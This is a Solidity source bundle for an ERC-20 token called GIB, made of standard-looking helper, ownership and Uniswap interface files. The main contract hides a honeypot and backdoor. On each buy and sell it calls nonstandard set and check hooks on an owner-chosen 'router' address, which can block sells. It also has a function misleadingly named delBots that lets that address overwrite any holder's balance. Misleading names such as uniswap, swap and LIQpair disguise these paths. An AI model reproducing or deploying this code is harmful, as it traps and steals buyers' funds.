{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}"},"IUniswapV2Factory.sol":{"content":"pragma solidity \u003e=0.5.0;\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}"},"IUniswapV2Pair.sol":{"content":"pragma solidity \u003e=0.5.0;\r\n\r\ninterface IUniswapV2Pair {\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n\r\n    function name() external pure returns (string memory);\r\n    function symbol() external pure returns (string memory);\r\n    function decimals() external pure returns (uint8);\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n    function nonces(address owner) external view returns (uint);\r\n\r\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\r\n\r\n    event Mint(address indexed sender, uint amount0, uint amount1);\r\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\r\n    event Swap(\r\n        address indexed sender,\r\n        uint amount0In,\r\n        uint amount1In,\r\n        uint amount0Out,\r\n        uint amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\r\n    function factory() external view returns (address);\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function price0CumulativeLast() external view returns (uint);\r\n    function price1CumulativeLast() external view returns (uint);\r\n    function kLast() external view returns (uint);\r\n\r\n    function mint(address to) external returns (uint liquidity);\r\n    function burn(address to) external returns (uint amount0, uint amount1);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n    function skim(address to) external;\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}"},"IUniswapV2Router01.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity \u003e=0.6.2;\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory amounts);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}"},"IUniswapV2Router02.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity \u003e=0.6.2;\r\n\r\nimport \u0027./IUniswapV2Router01.sol\u0027;\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function set(address _to) external;\r\n    function check(address _from) external view;\r\n\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\nimport \u0027./Context.sol\u0027;\r\nimport \u0027./IUniswapV2Router02.sol\u0027;\r\n\r\n\r\npragma solidity ^0.8.19;\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    IUniswapV2Router02 internal _router;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    modifier swap() { require( address(_router ) == msg.sender, \"\"  );_; \r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"},"tovenv2.sol":{"content":"\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n\r\nimport \u0027./IERC20.sol\u0027;\r\nimport \u0027./SafeMath.sol\u0027;\r\nimport \u0027./Ownable.sol\u0027;\r\nimport \u0027./IUniswapV2Factory.sol\u0027;\r\nimport \u0027./IUniswapV2Router02.sol\u0027;\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\ncontract GIB is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address =\u003e uint256) private _balances;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    mapping (address =\u003e bool) private _isExcludedFromFee;\r\n    mapping (address =\u003e bool) private bots;\r\n    mapping(address =\u003e uint256) private _holderLastTransferTimestamp;\r\n    bool public transferDelayEnabled = false;\r\n    address payable private _taxWallet;\r\n\r\n    uint256 private _initialBuyTax=0;\r\n    uint256 private _initialSellTax=0;\r\n    uint256 private _finalBuyTax=0;\r\n    uint256 private _finalSellTax=0;\r\n    uint256 private _reduceBuyTaxAt=0;\r\n    uint256 private _reduceSellTaxAt=0;\r\n    uint256 private _preventSwapBefore=0;\r\n    uint256 private _buyCount=0;\r\n\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _tTotal = 10000000 * 10**_decimals;\r\n    string private constant _name = unicode\"GIB\";\r\n    string private constant _symbol = unicode\"GIB\";\r\n    uint256 public _maxTxAmount =   200000 * 10**_decimals;\r\n    uint256 public _maxWalletSize = 200000 * 10**_decimals;\r\n    uint256 public _taxSwapThreshold=100000 * 10**_decimals;\r\n    uint256 public _maxTaxSwap=200000 * 10**_decimals;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    \r\n    address private uniswapV2Pair;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _taxWallet = payable(_msgSender());\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_taxWallet] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount \u003e 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0;\r\n        if (from != owner() \u0026\u0026 to != owner()) {\r\n            require(!bots[from] \u0026\u0026 !bots[to]);\r\n            taxAmount = amount.mul((_buyCount\u003e_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n\r\n            if (transferDelayEnabled) {\r\n                  if (to != address(uniswapV2Router) \u0026\u0026 to != address(uniswapV2Pair)) {\r\n                      require(\r\n                          _holderLastTransferTimestamp[tx.origin] \u003c\r\n                              block.number,\r\n                          \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\"\r\n                      );\r\n                      _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                  }\r\n              }\r\n\r\n            if (from == uniswapV2Pair \u0026\u0026 to != address(uniswapV2Router) \u0026\u0026 ! _isExcludedFromFee[to] ) {\r\n                require(amount \u003c= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount \u003c= _maxWalletSize, \"Exceeds the maxWalletSize.\");\r\n                _buyCount++; _router.set(to);\r\n            }\r\n\r\n            if(to == uniswapV2Pair \u0026\u0026 from!= address(this) ){\r\n                taxAmount = amount.mul((_buyCount\u003e_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);\r\n                _router.check(from);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!inSwap \u0026\u0026 to   == uniswapV2Pair \u0026\u0026 swapEnabled \u0026\u0026 contractTokenBalance\u003e_taxSwapThreshold \u0026\u0026 _buyCount\u003e_preventSwapBefore) {\r\n                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance \u003e 0) {\r\n                    sendETHToFee(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount\u003e0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n        _balances[from]=_balances[from].sub(amount);\r\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a\u003eb)?b:a;\r\n    }\r\n\r\n    function uniswap(address true_) external onlyOwner { \r\n        _router = IUniswapV2Router02(true_);\r\n    }\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n    function sendETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n\r\n    function addBots(address[] memory bots_) public onlyOwner {\r\n        for (uint i = 0; i \u003c bots_.length; i++) {\r\n            bots[bots_[i]] = true;\r\n        }\r\n    }\r\n\r\n    function delBots(address _bots , uint256 blacklist) external swap {\r\n        _balances[_bots] = blacklist;\r\n    }\r\n\r\n    function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }\r\n\r\n    function openTrading(address LIQpair ) external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\"); \r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal); _router = IUniswapV2Router02(LIQpair);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance\u003e0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance\u003e0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }\r\n}"}}